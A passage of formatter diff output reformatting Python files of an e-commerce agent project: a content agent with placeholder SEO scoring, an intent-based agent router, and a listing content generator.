             request: Content generation request
             template: Content template
@@ -418,21 +446,29 @@
         product_data = request.product_data
         product_name = product_data.get("name", "Product")
         brand = product_data.get("brand", "Brand")
         features = product_data.get("features", [])
         benefits = product_data.get("benefits", [])
-        
-        description = f"<p>Experience unparalleled performance with our {brand} {product_name}. "
-        description += "Designed for professionals who demand reliability and precision, "
-        description += "this high-performance tool delivers exceptional results every time.</p>"
-        
+
+        description = (
+            f"<p>Experience unparalleled performance with our {brand} {product_name}. "
+        )
+        description += (
+            "Designed for professionals who demand reliability and precision, "
+        )
+        description += (
+            "this high-performance tool delivers exceptional results every time.</p>"
+        )
+
         description += "<p>Crafted from aerospace-grade materials, our product offers "
         description += "superior durability while maintaining a lightweight feel for extended use without fatigue.</p>"
-        
+
         return description
 
-    def _generate_bullet_points(self, request: ContentGenerationRequest, template: Dict[str, Any]) -> List[str]:
+    def _generate_bullet_points(
+        self, request: ContentGenerationRequest, template: Dict[str, Any]
+    ) -> List[str]:
         """Generate bullet points based on request and template.
 
         Args:
             request: Content generation request
             template: Content template
@@ -443,19 +479,19 @@
         # In a real implementation, this would use the template and product data
         # For now, return placeholders
         product_data = request.product_data
         features = product_data.get("features", [])
         benefits = product_data.get("benefits", [])
-        
+
         bullet_points = [
             "PROFESSIONAL GRADE: Engineered to meet the demands of daily professional use",
             "DURABLE CONSTRUCTION: Made from aerospace-grade materials for exceptional longevity",
             "ERGONOMIC DESIGN: Comfortable grip reduces fatigue during extended use",
             "VERSATILE APPLICATION: Perfect for a wide range of projects and tasks",
             "SATISFACTION GUARANTEED: Backed by our comprehensive warranty and support",
         ]
-        
+
         return bullet_points
 
     def _generate_keywords(self, request: ContentGenerationRequest) -> List[str]:
         """Generate keywords based on request.
 
@@ -468,21 +504,27 @@
         # In a real implementation, this would analyze the product data
         # For now, return placeholders
         product_data = request.product_data
         product_name = product_data.get("name", "Product")
         brand = product_data.get("brand", "Brand")
-        
+
         keywords = [
             f"premium {product_name.lower()}",
             "professional tool",
             f"high performance {product_name.lower()}",
             "durable tool",
         ]
-        
+
         return keywords
 
-    def _calculate_seo_score(self, title: str, description: str, bullet_points: List[str], keywords: List[str]) -> int:
+    def _calculate_seo_score(
+        self,
+        title: str,
+        description: str,
+        bullet_points: List[str],
+        keywords: List[str],
+    ) -> int:
         """Calculate SEO score for content.
 
         Args:
             title: Content title
             description: Content description
@@ -493,23 +535,23 @@
             SEO score (0-100)
         """
         # In a real implementation, this would analyze the content for SEO factors
         # For now, return a placeholder score
         score = 85
-        
+
         # Add points for title length
         if len(title) >= 50 and len(title) <= 100:
             score += 5
-        
+
         # Add points for description length
         if len(description) >= 500:
             score += 5
-        
+
         # Add points for bullet points
         if len(bullet_points) >= 5:
             score += 5
-        
+
         # Ensure score is between 0 and 100
         return min(max(score, 0), 100)
 
     def _optimize_title(self, title: str, marketplace: str) -> str:
         """Optimize title for marketplace.
@@ -542,11 +584,13 @@
         """
         # In a real implementation, this would optimize the description for the marketplace
         # For now, return the original description
         return description
 
-    def _optimize_bullet_points(self, bullet_points: List[str], marketplace: str) -> List[str]:
+    def _optimize_bullet_points(
+        self, bullet_points: List[str], marketplace: str
+    ) -> List[str]:
         """Optimize bullet points for marketplace.
 
         Args:
             bullet_points: Original bullet points
             marketplace: Target marketplace
@@ -556,11 +600,13 @@
         """
         # In a real implementation, this would optimize the bullet points for the marketplace
         # For now, return the original bullet points
         return bullet_points
 
-    def _generate_improvements(self, original_content: Dict[str, Any], optimized_content: Dict[str, Any]) -> List[str]:
+    def _generate_improvements(
+        self, original_content: Dict[str, Any], optimized_content: Dict[str, Any]
+    ) -> List[str]:
         """Generate list of improvements made.
 
         Args:
             original_content: Original content
             optimized_content: Optimized content
@@ -575,14 +621,16 @@
             "Improved readability with shorter paragraphs",
             "Added specific product benefits to bullet points",
             "Incorporated marketplace-specific terminology",
             "Optimized title for search algorithm performance",
         ]
-        
+
         return improvements
 
-    def _calculate_overall_seo_score(self, content: Dict[str, Any], content_type: str, marketplace: str) -> int:
+    def _calculate_overall_seo_score(
+        self, content: Dict[str, Any], content_type: str, marketplace: str
+    ) -> int:
         """Calculate overall SEO score.
 
         Args:
             content: Content to analyze
             content_type: Type of content
@@ -593,11 +641,13 @@
         """
         # In a real implementation, this would analyze the content for SEO factors
         # For now, return a placeholder score
         return 82
 
-    def _analyze_keywords(self, content: Dict[str, Any], content_type: str, marketplace: str) -> Dict[str, Any]:
+    def _analyze_keywords(
+        self, content: Dict[str, Any], content_type: str, marketplace: str
+    ) -> Dict[str, Any]:
         """Analyze keywords in content.
 
         Args:
             content: Content to analyze
             content_type: Type of content
@@ -629,11 +679,13 @@
                     "placement_score": 80,
                 },
             ],
         }
 
-    def _calculate_readability_score(self, content: Dict[str, Any], content_type: str) -> int:
+    def _calculate_readability_score(
+        self, content: Dict[str, Any], content_type: str
+    ) -> int:
         """Calculate readability score.
 
         Args:
             content: Content to analyze
             content_type: Type of content
@@ -672,14 +724,16 @@
             "Add secondary keyword 'professional tool' to the title",
             "Include more specific product specifications",
             "Add a product comparison section",
             "Incorporate customer review highlights",
         ]
-        
+
         return recommendations
 
-    def _generate_marketplace_tips(self, marketplace: str, content_type: str) -> List[str]:
+    def _generate_marketplace_tips(
+        self, marketplace: str, content_type: str
+    ) -> List[str]:
         """Generate marketplace-specific tips.
 
         Args:
             marketplace: Target marketplace
             content_type: Type of content
@@ -707,11 +761,14 @@
                 "Add high-quality images from multiple angles",
                 "Highlight warranty and return policy information",
             ]
 
     def _check_marketplace_compliance(
-        self, marketplace: str, enhanced_images: List[Dict[str, Any]], enhancements: Dict[str, bool]
+        self,
+        marketplace: str,
+        enhanced_images: List[Dict[str, Any]],
+        enhancements: Dict[str, bool],
     ) -> bool:
         """Check if enhanced images comply with marketplace requirements.
 
         Args:
             marketplace: Target marketplace
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/conversational/advanced_nlu.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/content/content_agent_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/conversational/intelligent_router.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/conversational/intelligent_router.py	2025-06-19 04:03:37.471941+00:00
@@ -17,11 +17,11 @@
 
 
 @dataclass
 class AgentCapability:
     """Represents an agent's capabilities and specializations."""
-    
+
     agent_id: str
     agent_type: str
     specializations: List[str]
     supported_intents: List[str]
     current_load: float = 0.0
@@ -31,11 +31,11 @@
 
 
 @dataclass
 class RoutingDecision:
     """Represents a routing decision with reasoning."""
-    
+
     selected_agent: str
     confidence: float
     reasoning: List[str]
     alternative_agents: List[str] = field(default_factory=list)
     estimated_response_time: float = 1.0
@@ -43,117 +43,160 @@
 
 
 class IntelligentRouter:
     """
     Intelligent agent router for conversational interface.
-    
+
     Features:
     - Intent-based routing
     - Load balancing across agents
     - Context-aware routing decisions
     - Performance-based agent selection
     - Fallback routing strategies
     - Real-time agent availability tracking
     """
-    
+
     def __init__(self, config: Optional[Dict[str, Any]] = None):
         """
         Initialize the Intelligent Router.
-        
+
         Args:
             config: Optional configuration dictionary
         """
         self.config = config or {}
         self.registered_agents: Dict[str, AgentCapability] = {}
         self.routing_history: List[Dict[str, Any]] = []
         self.load_balancing_enabled = self.config.get("load_balancing", True)
-        self.performance_tracking_enabled = self.config.get("performance_tracking", True)
-        
+        self.performance_tracking_enabled = self.config.get(
+            "performance_tracking", True
+        )
+
         # Initialize default agent capabilities
         self._initialize_default_agents()
-        
+
         logger.info("IntelligentRouter initialized")
-    
+
     def _initialize_default_agents(self) -> None:
         """Initialize default agent capabilities."""
         default_agents = [
             AgentCapability(
                 agent_id="market_agent",
                 agent_type="MarketAgent",
                 specializations=["pricing", "market_analysis", "competitor_monitoring"],
-                supported_intents=["price_inquiry", "competitor_analysis", "market_trends"]
+                supported_intents=[
+                    "price_inquiry",
+                    "competitor_analysis",
+                    "market_trends",
+                ],
             ),
             AgentCapability(
                 agent_id="inventory_agent",
                 agent_type="InventoryAgent",
-                specializations=["stock_management", "inventory_tracking", "reorder_alerts"],
-                supported_intents=["inventory_check", "stock_inquiry", "reorder_request"]
+                specializations=[
+                    "stock_management",
+                    "inventory_tracking",
+                    "reorder_alerts",
+                ],
+                supported_intents=[
+                    "inventory_check",
+                    "stock_inquiry",
+                    "reorder_request",
+                ],
             ),
             AgentCapability(
                 agent_id="content_agent",
                 agent_type="ContentAgent",
-                specializations=["listing_creation", "seo_optimization", "content_enhancement"],
-                supported_intents=["listing_management", "content_optimization", "seo_inquiry"]
+                specializations=[
+                    "listing_creation",
+                    "seo_optimization",
+                    "content_enhancement",
+                ],
+                supported_intents=[
+                    "listing_management",
+                    "content_optimization",
+                    "seo_inquiry",
+                ],
             ),
             AgentCapability(
                 agent_id="logistics_agent",
                 agent_type="LogisticsAgent",
-                specializations=["shipping", "delivery_tracking", "warehouse_management"],
-                supported_intents=["shipping_inquiry", "delivery_status", "warehouse_operations"]
+                specializations=[
+                    "shipping",
+                    "delivery_tracking",
+                    "warehouse_management",
+                ],
+                supported_intents=[
+                    "shipping_inquiry",
+                    "delivery_status",
+                    "warehouse_operations",
+                ],
             ),
             AgentCapability(
                 agent_id="strategy_agent",
                 agent_type="StrategyAgent",
-                specializations=["strategic_planning", "decision_making", "optimization"],
-                supported_intents=["strategy_planning", "optimization_request", "decision_support"]
+                specializations=[
+                    "strategic_planning",
+                    "decision_making",
+                    "optimization",
+                ],
+                supported_intents=[
+                    "strategy_planning",
+                    "optimization_request",
+                    "decision_support",
+                ],
             ),
             AgentCapability(
                 agent_id="executive_agent",
                 agent_type="ExecutiveAgent",
                 specializations=["analytics", "reporting", "performance_monitoring"],
-                supported_intents=["sales_analytics", "performance_report", "business_insights"]
-            )
+                supported_intents=[
+                    "sales_analytics",
+                    "performance_report",
+                    "business_insights",
+                ],
+            ),
         ]
-        
+
         for agent in default_agents:
             self.registered_agents[agent.agent_id] = agent
-    
+
     async def route_request(
-        self, 
-        intent: Intent, 
-        context: Optional[Dict[str, Any]] = None
+        self, intent: Intent, context: Optional[Dict[str, Any]] = None
     ) -> RoutingDecision:
         """
         Route a request to the most appropriate agent.
-        
+
         Args:
             intent: Recognized user intent
             context: Optional conversation context
-            
+
         Returns:
             Routing decision with selected agent and reasoning
         """
         context = context or {}
-        
+
         # Find candidate agents
         candidates = self._find_candidate_agents(intent)
-        
+
         if not candidates:
             # Fallback to general assistant
             return RoutingDecision(
                 selected_agent="general_assistant",
                 confidence=0.5,
-                reasoning=["No specialized agents found for intent", "Routing to general assistant"],
-                estimated_response_time=2.0
+                reasoning=[
+                    "No specialized agents found for intent",
+                    "Routing to general assistant",
+                ],
+                estimated_response_time=2.0,
             )
-        
+
         # Score and rank candidates
         scored_candidates = self._score_candidates(candidates, intent, context)
-        
+
         # Select best candidate
         best_agent, best_score = scored_candidates[0]
-        
+
         # Generate routing decision
         decision = RoutingDecision(
             selected_agent=best_agent.agent_id,
             confidence=best_score,
             reasoning=self._generate_routing_reasoning(best_agent, intent, best_score),
@@ -161,230 +204,230 @@
             estimated_response_time=best_agent.response_time_avg,
             routing_metadata={
                 "intent_name": intent.intent_name,
                 "intent_confidence": intent.confidence,
                 "agent_type": best_agent.agent_type,
-                "agent_load": best_agent.current_load
-            }
+                "agent_load": best_agent.current_load,
+            },
         )
-        
+
         # Update routing history
         self._update_routing_history(decision, intent, context)
-        
-        logger.info(f"Routed {intent.intent_name} to {best_agent.agent_id} (confidence: {best_score:.2f})")
+
+        logger.info(
+            f"Routed {intent.intent_name} to {best_agent.agent_id} (confidence: {best_score:.2f})"
+        )
         return decision
-    
+
     def _find_candidate_agents(self, intent: Intent) -> List[AgentCapability]:
         """Find candidate agents that can handle the intent."""
         candidates = []
-        
+
         for agent in self.registered_agents.values():
             if not agent.availability:
                 continue
-            
+
             # Check if agent supports the intent
             if intent.intent_name in agent.supported_intents:
                 candidates.append(agent)
                 continue
-            
+
             # Check if agent has relevant specializations
             for entity in intent.entities:
-                if any(spec in entity.entity_type.lower() or entity.entity_type.lower() in spec 
-                      for spec in agent.specializations):
+                if any(
+                    spec in entity.entity_type.lower()
+                    or entity.entity_type.lower() in spec
+                    for spec in agent.specializations
+                ):
                     candidates.append(agent)
                     break
-        
+
         return candidates
-    
+
     def _score_candidates(
-        self, 
-        candidates: List[AgentCapability], 
-        intent: Intent, 
-        context: Dict[str, Any]
+        self, candidates: List[AgentCapability], intent: Intent, context: Dict[str, Any]
     ) -> List[Tuple[AgentCapability, float]]:
         """Score and rank candidate agents."""
         scored_candidates = []
-        
+
         for agent in candidates:
             score = self._calculate_agent_score(agent, intent, context)
             scored_candidates.append((agent, score))
-        
+
         # Sort by score (highest first)
         scored_candidates.sort(key=lambda x: x[1], reverse=True)
-        
+
         return scored_candidates
-    
+
     def _calculate_agent_score(
-        self, 
-        agent: AgentCapability, 
-        intent: Intent, 
-        context: Dict[str, Any]
+        self, agent: AgentCapability, intent: Intent, context: Dict[str, Any]
     ) -> float:
         """Calculate score for an agent based on multiple factors."""
         score = 0.0
-        
+
         # Intent match score (40% weight)
         if intent.intent_name in agent.supported_intents:
             score += 0.4
-        
+
         # Specialization match score (30% weight)
         specialization_matches = 0
         for entity in intent.entities:
             for spec in agent.specializations:
-                if spec in entity.entity_type.lower() or entity.entity_type.lower() in spec:
+                if (
+                    spec in entity.entity_type.lower()
+                    or entity.entity_type.lower() in spec
+                ):
                     specialization_matches += 1
-        
+
         if agent.specializations:
-            specialization_score = min(1.0, specialization_matches / len(agent.specializations))
+            specialization_score = min(
+                1.0, specialization_matches / len(agent.specializations)
+            )
             score += specialization_score * 0.3
-        
+
         # Performance score (15% weight)
         if self.performance_tracking_enabled:
             score += agent.performance_score * 0.15
-        
+
         # Load balancing score (15% weight)
         if self.load_balancing_enabled:
             load_score = max(0.0, 1.0 - agent.current_load)
             score += load_score * 0.15
-        
+
         # Context relevance bonus
         if context.get("preferred_agent") == agent.agent_id:
             score += 0.1
-        
+
         return min(1.0, score)
-    
+
     def _generate_routing_reasoning(
-        self, 
-        agent: AgentCapability, 
-        intent: Intent, 
-        score: float
+        self, agent: AgentCapability, intent: Intent, score: float
     ) -> List[str]:
         """Generate human-readable reasoning for routing decision."""
         reasoning = []
-        
+
         if intent.intent_name in agent.supported_intents:
             reasoning.append(f"Agent directly supports '{intent.intent_name}' intent")
-        
+
         if agent.specializations:
             matching_specs = []
             for entity in intent.entities:
                 for spec in agent.specializations:
                     if spec in entity.entity_type.lower():
                         matching_specs.append(spec)
-            
+
             if matching_specs:
                 reasoning.append(f"Agent specializes in: {', '.join(matching_specs)}")
-        
+
         if agent.performance_score > 0.8:
             reasoning.append("Agent has high performance rating")
-        
+
         if agent.current_load < 0.5:
             reasoning.append("Agent has low current load")
-        
+
         reasoning.append(f"Overall confidence score: {score:.2f}")
-        
+
         return reasoning
-    
+
     def _update_routing_history(
-        self, 
-        decision: RoutingDecision, 
-        intent: Intent, 
-        context: Dict[str, Any]
+        self, decision: RoutingDecision, intent: Intent, context: Dict[str, Any]
     ) -> None:
         """Update routing history for analytics."""
         history_entry = {
             "timestamp": datetime.utcnow().isoformat(),
             "intent_name": intent.intent_name,
             "intent_confidence": intent.confidence,
             "selected_agent": decision.selected_agent,
             "routing_confidence": decision.confidence,
             "reasoning": decision.reasoning,
-            "estimated_response_time": decision.estimated_response_time
+            "estimated_response_time": decision.estimated_response_time,
         }
-        
+
         self.routing_history.append(history_entry)
-        
+
         # Keep only last 100 routing decisions
         if len(self.routing_history) > 100:
             self.routing_history = self.routing_history[-100:]
-    
+
     async def register_agent(self, agent_capability: AgentCapability) -> bool:
         """Register a new agent with the router."""
         self.registered_agents[agent_capability.agent_id] = agent_capability
         logger.info(f"Registered agent: {agent_capability.agent_id}")
         return True
-    
+
     async def update_agent_status(
-        self, 
-        agent_id: str, 
+        self,
+        agent_id: str,
         availability: Optional[bool] = None,
         current_load: Optional[float] = None,
         performance_score: Optional[float] = None,
-        response_time_avg: Optional[float] = None
+        response_time_avg: Optional[float] = None,
     ) -> bool:
         """Update agent status and metrics."""
         if agent_id not in self.registered_agents:
             return False
-        
+
         agent = self.registered_agents[agent_id]
-        
+
         if availability is not None:
             agent.availability = availability
-        
+
         if current_load is not None:
             agent.current_load = max(0.0, min(1.0, current_load))
-        
+
         if performance_score is not None:
             agent.performance_score = max(0.0, min(1.0, performance_score))
-        
+
         if response_time_avg is not None:
             agent.response_time_avg = max(0.1, response_time_avg)
-        
+
         return True
-    
+
     async def get_routing_analytics(self) -> Dict[str, Any]:
         """Get routing analytics and statistics."""
         if not self.routing_history:
             return {"message": "No routing history available"}
-        
+
         # Calculate statistics
         total_routes = len(self.routing_history)
         agent_usage = {}
         avg_confidence = 0.0
         avg_response_time = 0.0
-        
+
         for entry in self.routing_history:
             agent = entry["selected_agent"]
             agent_usage[agent] = agent_usage.get(agent, 0) + 1
             avg_confidence += entry["routing_confidence"]
             avg_response_time += entry["estimated_response_time"]
-        
+
         avg_confidence /= total_routes
         avg_response_time /= total_routes
-        
+
         # Most used agent
         most_used_agent = max(agent_usage.items(), key=lambda x: x[1])[0]
-        
+
         return {
             "total_routing_decisions": total_routes,
             "average_routing_confidence": avg_confidence,
             "average_estimated_response_time": avg_response_time,
             "agent_usage_distribution": agent_usage,
             "most_used_agent": most_used_agent,
             "registered_agents": len(self.registered_agents),
-            "available_agents": sum(1 for agent in self.registered_agents.values() if agent.availability)
+            "available_agents": sum(
+                1 for agent in self.registered_agents.values() if agent.availability
+            ),
         }
-    
+
     async def get_agent_status(self) -> Dict[str, Dict[str, Any]]:
         """Get status of all registered agents."""
         return {
             agent_id: {
                 "agent_type": agent.agent_type,
                 "specializations": agent.specializations,
                 "supported_intents": agent.supported_intents,
                 "availability": agent.availability,
                 "current_load": agent.current_load,
                 "performance_score": agent.performance_score,
-                "response_time_avg": agent.response_time_avg
+                "response_time_avg": agent.response_time_avg,
             }
             for agent_id, agent in self.registered_agents.items()
         }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/conversational/intelligent_router.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/content/listing_content_agent.py	2025-06-14 20:35:30.759670+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/content/listing_content_agent.py	2025-06-19 04:03:37.616586+00:00
@@ -15,11 +15,11 @@
 
 
 class ListingContentAgent(BaseContentAgent):
     """
     Enhanced agent for generating and optimizing marketplace listing content.
-    
+
     Capabilities:
     - SEO-optimized title generation
     - Compelling product descriptions
     - Bullet point optimization
     - Keyword integration
@@ -51,16 +51,16 @@
             config_manager=config_manager,
             alert_manager=alert_manager,
             battery_optimizer=battery_optimizer,
             config=config,
         )
-        
+
         self.marketplace = marketplace
         self.content_templates = {}
         self.seo_keywords = {}
         self.marketplace_rules = {}
-        
+
         # Marketplace-specific configurations
         self.marketplace_configs = {
             "ebay": {
                 "title_max_length": 80,
                 "description_max_length": 500000,
@@ -76,16 +76,18 @@
         }
 
     def _get_required_config_fields(self) -> List[str]:
         """Get required configuration fields."""
         fields = super()._get_required_config_fields()
-        fields.extend([
-            "ai_service_url",
-            "content_model",
-            "seo_optimization_enabled",
-            "marketplace_rules_enabled",
-        ])
+        fields.extend(
+            [
+                "ai_service_url",
+                "content_model",
+                "seo_optimization_enabled",
+                "marketplace_rules_enabled",
+            ]
+        )
         return fields
 
     async def _setup_content_resources(self) -> None:
         """Set up content generation resources."""
         # Initialize AI service connection
@@ -125,96 +127,112 @@
         }
 
     async def _load_seo_keywords(self) -> None:
         """Load SEO keywords for different categories."""
         self.seo_keywords = {
-            "electronics": ["premium", "professional", "high-quality", "durable", "reliable"],
+            "electronics": [
+                "premium",
+                "professional",
+                "high-quality",
+                "durable",
+                "reliable",
+            ],
             "clothing": ["comfortable", "stylish", "trendy", "premium", "quality"],
             "home": ["elegant", "functional", "durable", "premium", "quality"],
             "default": ["premium", "quality", "professional", "reliable", "excellent"],
         }
 
     async def _handle_generation_event(self, event: Dict[str, Any]) -> None:
         """Handle content generation events."""
         try:
             product_data = event.get("product_data", {})
             content_type = event.get("content_type", "full_listing")
-            
+
             if content_type == "title":
                 result = await self.generate_optimized_title(product_data)
             elif content_type == "description":
                 result = await self.generate_product_description(product_data)
             elif content_type == "bullet_points":
                 result = await self.generate_bullet_points(product_data)
             else:
                 result = await self.generate_complete_listing(product_data)
-                
+
             self.metrics["content_generated"] += 1
-            logger.info(f"Generated {content_type} content for product {product_data.get('sku', 'unknown')}")
-            
+            logger.info(
+                f"Generated {content_type} content for product {product_data.get('sku', 'unknown')}"
+            )
+
         except Exception as e:
             logger.error(f"Error handling generation event: {e}")
 
     async def _handle_optimization_event(self, event: Dict[str, Any]) -> None:
         """Handle content optimization events."""
         try:
             existing_content = event.get("content", {})
             optimization_goals = event.get("goals", ["seo", "conversion"])
-            
-            result = await self.optimize_listing_content(existing_content, optimization_goals)
+
+            result = await self.optimize_listing_content(
+                existing_content, optimization_goals
+            )
             self.metrics["content_optimized"] += 1
             logger.info(f"Optimized content with goals: {optimization_goals}")
-            
+
         except Exception as e:
             logger.error(f"Error handling optimization event: {e}")
 
     async def _generate_content(self, task: Dict[str, Any]) -> Dict[str, Any]:
         """Generate new listing content."""
         try:
             product_data = task.get("product_data", {})
             content_type = task.get("content_type", "full_listing")
-            
+
             start_time = datetime.now(timezone.utc)
-            
+
             if content_type == "title":
                 content = await self.generate_optimized_title(product_data)
             elif content_type == "description":
                 content = await self.generate_product_description(product_data)
             elif content_type == "bullet_points":
                 content = await self.generate_bullet_points(product_data)
             else:
                 content = await self.generate_complete_listing(product_data)
-            
+
             end_time = datetime.now(timezone.utc)
             self.metrics["generation_latency"] = (end_time - start_time).total_seconds()
-            
-            return {"content": content, "success": True, "generation_time": self.metrics["generation_latency"]}
-            
+
+            return {
+                "content": content,
+                "success": True,
+                "generation_time": self.metrics["generation_latency"],
+            }
+
         except Exception as e:
             logger.error(f"Error generating content: {e}")
             return {"error": str(e), "success": False}
 
     async def _optimize_content(self, task: Dict[str, Any]) -> Dict[str, Any]:
         """Optimize existing listing content."""
         try:
             content = task.get("content", {})
             goals = task.get("optimization_goals", ["seo", "conversion"])
-            
+
             start_time = datetime.now(timezone.utc)
             optimized_content = await self.optimize_listing_content(content, goals)
             end_time = datetime.now(timezone.utc)
-            
-            self.metrics["optimization_latency"] = (end_time - start_time).total_seconds()
-            
+
+            self.metrics["optimization_latency"] = (
+                end_time - start_time
+            ).total_seconds()
+
             return {
                 "original_content": content,
                 "optimized_content": optimized_content,
                 "optimization_goals": goals,
                 "success": True,
                 "optimization_time": self.metrics["optimization_latency"],
             }
-            
+
         except Exception as e:
             logger.error(f"Error optimizing content: {e}")
             return {"error": str(e), "success": False}
 
     async def generate_optimized_title(self, product_data: Dict[str, Any]) -> str:
@@ -222,123 +240,138 @@
         try:
             category = product_data.get("category", "default")
             brand = product_data.get("brand", "Brand")
             model = product_data.get("model", product_data.get("name", "Product"))
             condition = product_data.get("condition", "New")
-            
+
             # Get marketplace constraints
-            max_length = self.marketplace_configs.get(self.marketplace, {}).get("title_max_length", 80)
-            
+            max_length = self.marketplace_configs.get(self.marketplace, {}).get(
+                "title_max_length", 80
+            )
+
             # Get template for category
-            template = self.content_templates["title"].get(category, self.content_templates["title"]["default"])
-            
+            template = self.content_templates["title"].get(
+                category, self.content_templates["title"]["default"]
+            )
+
             # Generate title components
             key_feature = self._extract_key_feature(product_data)
             unique_selling_point = self._generate_unique_selling_point(product_data)
-            
+
             # Format title
             title = template.format(
                 brand=brand,
                 model=model,
                 key_feature=key_feature,
                 condition=condition,
                 unique_selling_point=unique_selling_point,
                 product_name=model,
             )
-            
+
             # Ensure title fits marketplace constraints
             if len(title) > max_length:
-                title = title[:max_length-3] + "..."
-                
+                title = title[: max_length - 3] + "..."
+
             return title
-            
+
         except Exception as e:
             logger.error(f"Error generating title: {e}")
             return f"{product_data.get('brand', 'Brand')} {product_data.get('name', 'Product')}"
 
     async def generate_product_description(self, product_data: Dict[str, Any]) -> str:
         """Generate compelling product description."""
         try:
             brand = product_data.get("brand", "Brand")
             product_name = product_data.get("name", "Product")
             features = product_data.get("features", [])
-            
+
             # Build description sections
             intro = self.content_templates["description"]["intro"].format(
                 product_name=product_name, brand=brand
             )
-            
+
             features_text = ""
             if features:
                 features_list = ", ".join(features[:5])  # Limit to top 5 features
-                features_text = self.content_templates["description"]["features"].format(
-                    features_list=features_list
-                )
-            
+                features_text = self.content_templates["description"][
+                    "features"
+                ].format(features_list=features_list)
+
             benefits = self.content_templates["description"]["benefits"].format(
                 use_cases=self._generate_use_cases(product_data),
                 value_proposition=self._generate_value_proposition(product_data),
             )
-            
+
             closing = self.content_templates["description"]["closing"]
-            
+
             # Combine sections
             description = f"{intro}\n\n{features_text}\n\n{benefits}\n\n{closing}"
-            
+
             # Add SEO keywords naturally
-            description = await self._enhance_with_seo_keywords(description, product_data)
-            
+            description = await self._enhance_with_seo_keywords(
+                description, product_data
+            )
+
             return description
-            
+
         except Exception as e:
             logger.error(f"Error generating description: {e}")
             return f"High-quality {product_data.get('name', 'product')} from {product_data.get('brand', 'Brand')}."
 
     async def generate_bullet_points(self, product_data: Dict[str, Any]) -> List[str]:
         """Generate optimized bullet points."""
         try:
             bullet_points = []
-            max_bullets = self.marketplace_configs.get(self.marketplace, {}).get("bullet_points_max", 5)
-            
+            max_bullets = self.marketplace_configs.get(self.marketplace, {}).get(
+                "bullet_points_max", 5
+            )
+
             # Generate bullet points based on product data
             material = product_data.get("material", "premium materials")
             primary_use = product_data.get("primary_use", "everyday use")
-            included_items = product_data.get("included_items", "all necessary components")
+            included_items = product_data.get(
+                "included_items", "all necessary components"
+            )
             warranty = product_data.get("warranty", "Manufacturer warranty included")
-            
+
             template_bullets = self.content_templates["bullet_points"]
-            
+
             for i, template in enumerate(template_bullets[:max_bullets]):
                 bullet = template.format(
                     material=material,
                     primary_use_case=primary_use,
                     included_items=included_items,
                     warranty_info=warranty,
                 )
                 bullet_points.append(bullet)
-                
+
             return bullet_points
-            
+
         except Exception as e:
             logger.error(f"Error generating bullet points: {e}")
-            return ["Premium quality product", "Professional grade", "Satisfaction guaranteed"]
-
-    async def generate_complete_listing(self, product_data: Dict[str, Any]) -> Dict[str, Any]:
+            return [
+                "Premium quality product",
+                "Professional grade",
+                "Satisfaction guaranteed",
+            ]
+
+    async def generate_complete_listing(
+        self, product_data: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Generate complete listing content."""
         try:
             title = await self.generate_optimized_title(product_data)
             description = await self.generate_product_description(product_data)
             bullet_points = await self.generate_bullet_points(product_data)
-            
+
             # Calculate quality scores
             title_score = self._calculate_quality_score(title)
             description_score = self._calculate_quality_score(description)
             seo_score = self._calculate_seo_score(
-                f"{title} {description}", 
-                self._get_relevant_keywords(product_data)
-            )
-            
+                f"{title} {description}", self._get_relevant_keywords(product_data)
+            )
+
             return {
                 "title": title,
                 "description": description,
                 "bullet_points": bullet_points,
                 "quality_scores": {
@@ -348,11 +381,11 @@
                     "overall": (title_score + description_score + seo_score) / 3,
                 },
                 "marketplace": self.marketplace,
                 "generated_at": datetime.now(timezone.utc).isoformat(),
             }
-            
+
         except Exception as e:
             logger.error(f"Error generating complete listing: {e}")
             return {"error": str(e)}
 
     async def optimize_listing_content(
@@ -360,29 +393,33 @@
     ) -> Dict[str, Any]:
         """Optimize existing listing content."""
         try:
             optimized = content.copy()
             improvements = []
-            
+
             if "seo" in optimization_goals:
                 optimized, seo_improvements = await self._optimize_for_seo(optimized)
                 improvements.extend(seo_improvements)
-                
+
             if "conversion" in optimization_goals:
-                optimized, conversion_improvements = await self._optimize_for_conversion(optimized)
+                optimized, conversion_improvements = (
+                    await self._optimize_for_conversion(optimized)
+                )
                 improvements.extend(conversion_improvements)
-                
+
             if "readability" in optimization_goals:
-                optimized, readability_improvements = await self._optimize_for_readability(optimized)
+                optimized, readability_improvements = (
+                    await self._optimize_for_readability(optimized)
+                )
                 improvements.extend(readability_improvements)
-            
+
             optimized["improvements"] = improvements
             optimized["optimization_goals"] = optimization_goals
             optimized["optimized_at"] = datetime.now(timezone.utc).isoformat()
-            
+
             return optimized
-            
+
         except Exception as e:
             logger.error(f"Error optimizing content: {e}")
             return content
 
     # Helper methods
@@ -393,11 +430,16 @@
             return features[0]
         return product_data.get("key_benefit", "Premium Quality")
 
     def _generate_unique_selling_point(self, product_data: Dict[str, Any]) -> str:
         """Generate a unique selling point."""
-        usp_options = ["Fast Shipping", "Satisfaction Guaranteed", "Premium Quality", "Professional Grade"]
+        usp_options = [
+            "Fast Shipping",
+            "Satisfaction Guaranteed",
+            "Premium Quality",
+            "Professional Grade",
+        ]
         return product_data.get("usp", usp_options[0])
 
     def _generate_use_cases(self, product_data: Dict[str, Any]) -> str:
         """Generate relevant use cases."""
         category = product_data.get("category", "general")
@@ -411,68 +453,83 @@
 
     def _generate_value_proposition(self, product_data: Dict[str, Any]) -> str:
         """Generate value proposition."""
         return "Combining quality, reliability, and exceptional value in one premium product."
 
-    async def _enhance_with_seo_keywords(self, text: str, product_data: Dict[str, Any]) -> str:
+    async def _enhance_with_seo_keywords(
+        self, text: str, product_data: Dict[str, Any]
+    ) -> str:
         """Enhance text with relevant SEO keywords."""
         category = product_data.get("category", "default")
         keywords = self.seo_keywords.get(category, self.seo_keywords["default"])
-        
+
         # Simple keyword integration (in a real implementation, this would be more sophisticated)
         enhanced_text = text
         for keyword in keywords[:2]:  # Add top 2 keywords naturally
             if keyword not in enhanced_text.lower():
-                enhanced_text = enhanced_text.replace("quality", f"{keyword} quality", 1)
-                
+                enhanced_text = enhanced_text.replace(
+                    "quality", f"{keyword} quality", 1
+                )
+
